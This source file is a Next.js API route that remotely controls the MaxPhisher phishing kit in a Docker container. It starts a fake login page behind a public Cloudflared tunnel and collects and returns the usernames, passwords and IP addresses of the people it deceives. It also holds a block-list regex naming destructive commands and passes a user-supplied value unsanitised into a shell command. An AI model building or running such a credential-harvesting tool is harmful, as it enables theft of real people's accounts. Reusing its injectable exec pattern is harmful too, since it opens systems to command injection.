// app/api/phishing/[action]/route.js
import { NextResponse } from "next/server";
import { exec } from "child_process";
import { promisify } from "util";
import containerName from "../../../lib/containerName"; // Adjust path if needed
import path from 'path'; // To safely join paths

const execPromise = promisify(exec);

// --- Configuration (Adjust paths inside the container as needed) ---
const MAXPHISHER_DIR = "/root/maxphisher"; // Where MaxPhisher is installed
const PYTHON_EXEC = "python3"; // Or 'python' if that's the command in your container
const MAXPHISHER_SCRIPT = path.join(MAXPHISHER_DIR, "maxphisher.py");
const TEMP_SITE_DIR = "/tmp/phish_site"; // Where the template files will be copied
const STATUS_FILE = "/tmp/phish_status.txt";
const URL_FILE = "/tmp/phish_url.txt";
const CRED_FILE = path.join(TEMP_SITE_DIR, "usernames.txt");
const IP_FILE = path.join(TEMP_SITE_DIR, "ip.txt");
const PHP_PORT = 8080; // Port PHP will run on inside the container
// --- End Configuration ---


// Helper to run commands in Docker, handling potential errors
async function runDockerCommand(command, ignoreError = false) {
    // Basic check for obviously dangerous patterns (simple version)
    if (/\b(rm\s+-rf|shutdown|reboot|mkfs|dd)\b/.test(command)) {
        console.error("Potentially dangerous command blocked:", command);
        throw new Error("Dangerous command pattern detected.");
    }

    const dockerCommand = `docker exec ${containerName} bash -c "${command.replace(/"/g, '\\"')}"`; // Escape double quotes for bash -c
    console.log("Executing:", dockerCommand); // Log the command being run
    try {
        const { stdout, stderr } = await execPromise(dockerCommand, { timeout: 30000 }); // 30s timeout
        if (stderr && !ignoreError) { // Ignore stderr only if specified
             // Sometimes tools write non-fatal info to stderr, check specific cases if needed
             console.warn(`Docker command stderr for "${command}":`, stderr);
             // Optionally throw error based on stderr content
        }
        return stdout.trim();
    } catch (error) {
        console.error(`Error executing docker command "${command}":`, error);
        throw new Error(`Failed to execute in container: ${error.message} (Command: ${command})`);
    }
}

// Helper to ensure VM is running
async function ensureVMRunning() {
    try {
        const { stdout: runningContainers } = await execPromise(
            `docker ps -q -f name=^/${containerName}$` // Use ^/$ for exact match
        );
        if (!runningContainers.trim()) {
            console.log(`Container ${containerName} not running, attempting to start...`);
            await execPromise(`docker start ${containerName}`);
             // Add a small delay to allow the container to fully start
            await new Promise(resolve => setTimeout(resolve, 2000));
            // Verify again
             const { stdout: runningAfterStart } = await execPromise(
                `docker ps -q -f name=^/${containerName}$`
            );
            if (!runningAfterStart.trim()) {
                 throw new Error("VM could not be started.");
            }
            console.log(`Container ${containerName} started.`);
        }
    } catch (error) {
         console.error("Error checking/starting VM:", error);
         throw new Error("VM is not running and could not be started.");
    }
}

// --- API Action Handlers ---

async function handleStart(request) {
    const { template } = await request.json(); // e.g., '1' or '2' based on MaxPhisher options
    if (!template) {
        return NextResponse.json({ error: "Template option is required" }, { status: 400 });
    }

    try {
        await ensureVMRunning();

        // 1. Clean up previous run (important!)
        console.log("Cleaning up previous phishing session artifacts...");
        // Use ignoreError=true as files might not exist on first run
        await runDockerCommand(`pkill -f "php -S 127.0.0.1:${PHP_PORT}"`, true);
        await runDockerCommand(`pkill -f cloudflared`, true);
        await runDockerCommand(`rm -rf ${TEMP_SITE_DIR}`, true);
        await runDockerCommand(`rm -f ${STATUS_FILE} ${URL_FILE}`, true);
        await runDockerCommand(`mkdir ${TEMP_SITE_DIR}`); // Recreate site dir
        console.log("Cleanup complete.");


        // 2. Write "starting" status
        await runDockerCommand(`echo 'starting' > ${STATUS_FILE}`);

        // 3. Start MaxPhisher in a "headless" mode (using specific args)
        // We use nohup and & to run in background. Redirect output to /dev/null
        // This assumes MaxPhisher can run non-interactively with flags.
        // We use --noupdate, specify type (Login='2'), option, port, and tunneler ('Cloudflared').
        // The key is to make MaxPhisher *write the URL and status* instead of printing and waiting.
        // *** This might require modifying MaxPhisher's server() or main() function ***
        // *** OR create a wrapper script inside the container that does this. ***

        // --- Simplified Assumption: MaxPhisher (or wrapper) handles backgrounding & file writing ---
         // We tell MaxPhisher to use Cloudflared, specific type/option, and the designated site/port.
         // MaxPhisher *must* be modified/wrapped to:
         //    a) Write the final Cloudflared URL to URL_FILE
         //    b) Write 'running' or 'error: description' to STATUS_FILE
         //    c) Run PHP and Cloudflared in the background itself.
         //    d) Exit after setup, leaving PHP & Cloudflared running.

        const maxphisherCommand = `cd ${MAXPHISHER_DIR} && ${PYTHON_EXEC} ${MAXPHISHER_SCRIPT} --type 2 --option ${template} --port ${PHP_PORT} --tunneler Cloudflared --mode api --status-file ${STATUS_FILE} --url-file ${URL_FILE} --site-dir ${TEMP_SITE_DIR} --noupdate --nokey`;

        // Run the setup command in the background using nohup
        // We don't wait for this command to finish.
        console.log("Initiating phishing setup in background...");
        await runDockerCommand(`nohup ${maxphisherCommand} > /dev/null 2>&1 &`);


        // 4. Poll for status/URL (Wait a bit for setup)
        console.log("Waiting for phishing setup to complete (max 30s)...");
        let status = "starting";
        let url = "";
        for (let i = 0; i < 15; i++) { // Check every 2 seconds for 30 seconds
            await new Promise(resolve => setTimeout(resolve, 2000));
            try {
                status = await runDockerCommand(`cat ${STATUS_FILE}`, true); // Ignore error if file not ready
                 if (status.startsWith("error")) {
                    console.error("Phishing setup failed:", status);
                    throw new Error(status);
                }
                if (status === 'running') {
                    url = await runDockerCommand(`cat ${URL_FILE}`, true);
                     if (url.startsWith("https://")) {
                         console.log("Phishing setup successful. URL:", url);
                         break; // Success
                    }
                }
            } catch(pollError) {
                 if (pollError.message.startsWith("error:")) {
                     // Propagate specific error from status file
                    throw pollError;
                 }
                 console.warn("Polling warning:", pollError.message); // Log other poll errors but continue
            }
        }

        if (status !== 'running' || !url.startsWith("https://")) {
            const finalStatus = await runDockerCommand(`cat ${STATUS_FILE}`, true); // Get last known status
            const errorMsg = `Phishing setup timed out or failed. Final status: ${finalStatus || 'unknown'}. Check container logs.`;
            console.error(errorMsg);
            // Attempt cleanup on failure
             await runDockerCommand(`pkill -f "php -S 127.0.0.1:${PHP_PORT}"`, true);
             await runDockerCommand(`pkill -f cloudflared`, true);
             await runDockerCommand(`echo 'error: timeout or setup failure' > ${STATUS_FILE}`);
            throw new Error(errorMsg);
        }

        return NextResponse.json({ success: true, url: url, status: 'running' });

    } catch (error) {
        console.error("Error in handleStart:", error);
        // Ensure status file reflects error
        try {
             await runDockerCommand(`echo 'error: ${error.message.replace(/'/g, '"')}' > ${STATUS_FILE}`);
        } catch (statusError) {
            console.error("Failed to write error status:", statusError);
        }
        return NextResponse.json({ error: error.message || "Failed to start phishing session" }, { status: 500 });
    }
}


async function handleStatus(request) {
     try {
         await ensureVMRunning(); // Make sure VM is running before checking

        let status = "idle";
        let capturedCreds = "";
        let capturedIps = "";

        // Check status file first
         try {
             status = await runDockerCommand(`cat ${STATUS_FILE}`);
        } catch (e) {
            // If status file doesn't exist, assume idle or stopped, but don't error out here
             console.warn("Could not read status file, assuming idle/stopped.");
             status = "idle"; // Or determine based on running processes if needed
             // You could check if php/cloudflared are running as a fallback
             // const phpRunning = await runDockerCommand("pgrep -f 'php -S 127.0.0.1:8080'", true);
             // if (phpRunning) status = 'running'; // Example fallback
        }

         if (status !== 'running') {
            // If not running, don't bother checking for creds/IPs
            return NextResponse.json({ status: status, credentials: [], ips: [] });
        }


        // Check for captured credentials if running
         try {
            // Check if file exists and has content
            // Using `cat || echo ''` ensures command succeeds even if file empty/missing
            capturedCreds = await runDockerCommand(`[ -s ${CRED_FILE} ] && cat ${CRED_FILE} || echo ''`);
            if (capturedCreds) {
                console.log("Credentials captured!");
                 // Clear the file *after* reading
                 await runDockerCommand(`echo -n "" > ${CRED_FILE}`);
            }
        } catch (error) {
            console.warn("Could not read or clear credentials file:", error.message);
             // Don't fail the whole status check, just report no creds found this time
             capturedCreds = "";
        }

        // Check for captured IPs if running
         try {
             capturedIps = await runDockerCommand(`[ -s ${IP_FILE} ] && cat ${IP_FILE} || echo ''`);
             if (capturedIps) {
                 console.log("IP captured!");
                 await runDockerCommand(`echo -n "" > ${IP_FILE}`);
            }
        } catch (error) {
            console.warn("Could not read or clear IP file:", error.message);
             capturedIps = "";
        }

        // Process captured data into arrays (simple line splitting)
         const credentials = capturedCreds ? capturedCreds.split('\n').filter(line => line.trim() !== '') : [];
         const ips = capturedIps ? capturedIps.split('\n').filter(line => line.trim() !== '') : [];


        return NextResponse.json({ status: status, credentials, ips });

     } catch (error) {
         console.error("Error in handleStatus:", error);
          // Try to update status file if possible
         try {
              await runDockerCommand(`echo 'error: ${error.message.replace(/'/g, '"')}' > ${STATUS_FILE}`);
         } catch (statusError) {
             console.error("Failed to write error status:", statusError);
         }
         return NextResponse.json({ error: error.message || "Failed to get phishing status" }, { status: 500 });
     }
}

async function handleStop(request) {
     try {
         await ensureVMRunning();

        console.log("Stopping phishing session...");
         // 1. Kill PHP and Cloudflared processes
         await runDockerCommand(`pkill -f "php -S 127.0.0.1:${PHP_PORT}"`, true); // Ignore error if not running
         await runDockerCommand(`pkill -f cloudflared`, true); // Ignore error if not running

        // 2. Update status file
         await runDockerCommand(`echo 'stopped' > ${STATUS_FILE}`);

        // 3. Optional: Clean up temp files (or leave logs/creds if desired)
         // await runDockerCommand(`rm -f ${URL_FILE}`);
         // await runDockerCommand(`rm -rf ${TEMP_SITE_DIR}`); // Careful: this deletes captured creds too if not saved

        console.log("Phishing session stopped.");
        return NextResponse.json({ success: true, status: 'stopped' });

     } catch (error) {
         console.error("Error in handleStop:", error);
          // Try to update status file if possible
         try {
              await runDockerCommand(`echo 'error: ${error.message.replace(/'/g, '"')}' > ${STATUS_FILE}`);
         } catch (statusError) {
             console.error("Failed to write error status:", statusError);
         }
         return NextResponse.json({ error: error.message || "Failed to stop phishing session" }, { status: 500 });
     }
}


// Main POST handler
export async function POST(request, { params }) {
    const { action } = params;

    try {
        if (action === 'start') {
            return await handleStart(request);
        } else if (action === 'status') {
            return await handleStatus(request);
        } else if (action === 'stop') {
            return await handleStop(request);
        } else {
            return NextResponse.json({ error: "Invalid action" }, { status: 404 });
        }
    } catch (error) {
         // General catch block for unexpected errors during handler selection/execution
        console.error(`API route error for action ${action}:`, error);
        return NextResponse.json(
             { error: "Internal server error in phishing API" },
             { status: 500 }
         );
    }
}

// Handle OPTIONS requests for CORS
export async function OPTIONS() {
    return NextResponse.json({}, {
        headers: {
            "Access-Control-Allow-Origin": "*", // Adjust for production
            "Access-Control-Allow-Methods": "POST, OPTIONS",
            "Access-Control-Allow-Headers": "Content-Type",
        },
    });
}

// Optional: Add GET handler for status if preferred for polling
export async function GET(request, { params }) {
     const { action } = params;
     if (action === 'status') {
         // Re-use the status logic, GET typically doesn't have a body
         return await handleStatus(request); // Pass request object even if unused
     } else {
         return NextResponse.json({ error: "Invalid action for GET request" }, { status: 405 });
     }
 }